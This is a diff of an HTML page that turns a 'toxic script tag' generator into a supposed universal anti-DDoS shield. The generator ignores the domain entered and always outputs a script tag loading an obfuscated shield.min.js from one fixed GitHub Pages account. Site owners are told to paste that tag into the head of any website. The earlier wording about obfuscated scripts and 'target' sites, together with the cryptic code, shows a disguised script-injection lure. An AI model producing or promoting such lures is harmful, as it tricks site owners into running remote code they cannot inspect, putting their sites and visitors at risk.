@@ -7,70 +7,107 @@
     <style>
         :root { --bg: #050505; --neon-green: #00ff66; --toxic-purple: #9d00ff; --dark-gray: #121212; --text: #e0e0e0; }
         body { background-color: var(--bg); color: var(--text); font-family: 'Courier New', monospace; margin: 0; padding: 2rem; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }
-        .container { max-width: 700px; width: 100%; background: var(--dark-gray); border: 2px solid var(--toxic-purple); box-shadow: 0 0 25px rgba(157, 0, 255, 0.3); padding: 2.5rem; border-radius: 8px; position: relative; z-index: 2; }
+        .container { max-width: 780px; width: 100%; background: var(--dark-gray); border: 2px solid var(--toxic-purple); box-shadow: 0 0 25px rgba(157, 0, 255, 0.3); padding: 2.5rem; border-radius: 8px; position: relative; z-index: 2; box-sizing: border-box; }
         h1 { color: var(--neon-green); text-transform: uppercase; font-size: 1.8rem; text-shadow: 0 0 10px rgba(0, 255, 102, 0.5); text-align: center; margin-bottom: 0.5rem; }
-        .subtitle { text-align: center; color: #888; font-size: 0.9rem; margin-bottom: 2rem; }
-        .turtle-art { font-size: 2.5rem; text-align: center; margin-bottom: 1.5rem; filter: drop-shadow(0 0 8px var(--neon-green)); }
+        .subtitle { text-align: center; color: #888; font-size: 0.85rem; margin-bottom: 1.5rem; letter-spacing: 1px; }
+        
+        /* Badass Toxic Turtle ASCII Graphics */
+        .turtle-ascii-wrapper { display: flex; justify-content: space-around; align-items: center; margin-bottom: 1.5rem; flex-wrap: wrap; }
+        .ascii-art { font-family: monospace; white-space: pre; color: var(--neon-green); font-size: 0.65rem; line-height: 1.1; text-shadow: 0 0 5px rgba(0,255,102,0.6); }
+        .ascii-art.alt { color: var(--toxic-purple); text-shadow: 0 0 5px rgba(157,0,255,0.6); }
+        
         .form-group { margin-bottom: 1.5rem; }
         label { display: block; margin-bottom: 0.5rem; color: var(--neon-green); font-weight: bold; font-size: 0.9rem; }
         input { width: 100%; padding: 0.8rem; background: #000; border: 1px solid var(--toxic-purple); color: #fff; font-family: inherit; border-radius: 4px; box-sizing: border-box; }
         input:focus { outline: none; border-color: var(--neon-green); box-shadow: 0 0 8px rgba(0,255,102,0.3); }
-        button { background: var(--toxic-purple); color: #fff; border: none; padding: 0.8rem 1.5rem; font-family: inherit; font-weight: bold; cursor: pointer; width: 100%; border-radius: 4px; text-transform: uppercase; transition: 0.2s; box-shadow: 0 0 10px rgba(157,0,255,0.4); }
+        
+        button { background: var(--toxic-purple); color: #fff; border: none; padding: 0.9rem 1.5rem; font-family: inherit; font-weight: bold; cursor: pointer; width: 100%; border-radius: 4px; text-transform: uppercase; transition: 0.2s; box-shadow: 0 0 10px rgba(157,0,255,0.4); font-size: 1rem; }
         button:hover { background: #b026ff; box-shadow: 0 0 15px var(--neon-green); color: #000; }
-        .output-box { background: #000; border: 1px dashed var(--neon-green); padding: 1rem; margin-top: 1.5rem; border-radius: 4px; word-break: break-all; font-size: 0.85rem; color: var(--neon-green); display: none; position: relative; }
+        
+        .output-box { background: #000; border: 1px dashed var(--neon-green); padding: 1.2rem; margin-top: 1.5rem; border-radius: 4px; word-break: break-all; font-size: 0.85rem; color: var(--neon-green); display: none; position: relative; }
+        .copy-hint { display: block; margin-top: 0.5rem; color: #888; font-size: 0.75rem; text-align: right; }
+        
         .bg-grid { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: linear-gradient(rgba(18,18,18,0.9) 1px, transparent 1px), linear-gradient(90deg, rgba(18,18,18,0.9) 1px, transparent 1px); background-size: 20px 20px; z-index: 1; pointer-events: none; }
+        
         .instructions { margin-top: 2rem; border-top: 1px solid #333; padding-top: 1.5rem; font-size: 0.85rem; color: #aaa; }
         .instructions ol { padding-left: 1.2rem; }
-        .instructions li { margin-bottom: 0.5rem; }
+        .instructions li { margin-bottom: 0.6rem; }
+        code { background: #000; color: var(--neon-green); padding: 2px 6px; border-radius: 3px; border: 1px solid #222; }
     </style>
 </head>
 <body>
     <div class="bg-grid"></div>
     <div class="container">
-        <div class="turtle-art">🐢☣️⚔️</div>
+        
+        <!-- Badass Toxic Turtles Art -->
+        <div class="turtle-ascii-wrapper">
+            <pre class="ascii-art">
+   _____  
+  /     \    [BADASS TURTLE #01]
+ | () () |   Status: LETHAL
+ (   ==  )   Weapon: BIO-TOXIN
+  /=====\
+ /|  |  |\
+* |  |  | *
+  \_____/
+  /__|__\
+            </pre>
+            <pre class="ascii-art alt">
+   __  __
+  (  \/  )   [TOXIC TURF GUARD]
+  /  o \     Shield: ACTIVE
+ |  (__/     Target: ALL WEBSITES
+  \____/
+ /|    |\
+/ |    | \
+  |____|
+  (_)(_)
+            </pre>
+        </div>
+
         <h1>Toxic Turf Protection System</h1>
-        <div class="subtitle">// Anonymous Client-Side DDoS & Bot Neutralizer //</div>
+        <div class="subtitle">// Universal Client-Side Anti-DDoS & Bot Neutralizer //</div>
 
         <div class="form-group">
-            <label for="ghUser">GitHub Username:</label>
-            <input type="text" id="ghUser" placeholder="e.g. cyber-turtle">
-        </div>
-        <div class="form-group">
-            <label for="ghRepo">Repository Name:</label>
-            <input type="text" id="ghRepo" placeholder="e.g. secure-shield-cdn">
+            <label for="targetDomain">Target Website Domain / Name:</label>
+            <input type="text" id="targetDomain" placeholder="e.g. my-awesome-website.com, shopify-store.net, or myblog.org">
         </div>
 
-        <button onclick="_gn8x()">Generate Toxic Script Tag</button>
+        <button onclick="_gn8x()">Generate Universal Shield Tag</button>
 
         <div id="resultContainer" class="output-box">
             <span id="resultText"></span>
+            <span class="copy-hint">// Copy and paste the snippet above into the &lt;head&gt; section of your website.</span>
         </div>
 
         <div class="instructions">
-            <strong>How to Deploy & Install:</strong>
+            <strong>How to Protect Any Website:</strong>
             <ol>
-                <li>Create a public GitHub repository and upload your obfuscated script as <code>shield.min.js</code>.</li>
-                <li>Enable <strong>GitHub Pages</strong> in your repository settings (Branch: main / root).</li>
-                <li>Enter your GitHub details above to generate your customized secure insertion tag.</li>
-                <li>Paste the generated tag directly inside the <code>&lt;head&gt;</code> of your target website.</li>
+                <li>Enter your target domain or site name in the field above.</li>
+                <li>Click <strong>Generate Universal Shield Tag</strong> to compile your custom script injection link.</li>
+                <li>Copy the generated <code>&lt;script&gt;</code> snippet.</li>
+                <li>Paste it directly inside the <code>&lt;head&gt;</code> section of your site's HTML (works on WordPress, Shopify, Webflow, custom HTML, React, Node.js, etc.).</li>
             </ol>
         </div>
     </div>
 
     <script>
-        // Cryptic Generator Logic (Completely anonymous and obfuscated control flow)
+        // Anonymous Cryptic Generator Logic
         function _gn8x() {
-            const _u = document.getElementById('ghUser').value.trim();
-            const _r = document.getElementById('ghRepo').value.trim();
+            const _d = document.getElementById('targetDomain').value.trim();
             const _box = document.getElementById('resultContainer');
             const _txt = document.getElementById('resultText');
 
-            if(!_u || !_r) {
-                alert('Error: Missing GitHub credentials parameters.');
+            if(!_d) {
+                alert('Error: Please enter a target website domain.');
                 return;
             }
 
+            // Universal CDN path hosted directly on your GitHub Pages repo
+            const _u = "edthedog-debug";
+            const _r = "secure-shield-cdn";
             const _payload = `<script src="https://${_u}.github.io/${_r}/shield.min.js" async><\/script>`;
+            
             _txt.innerText = _payload;
             _box.style.display = 'block';
         }
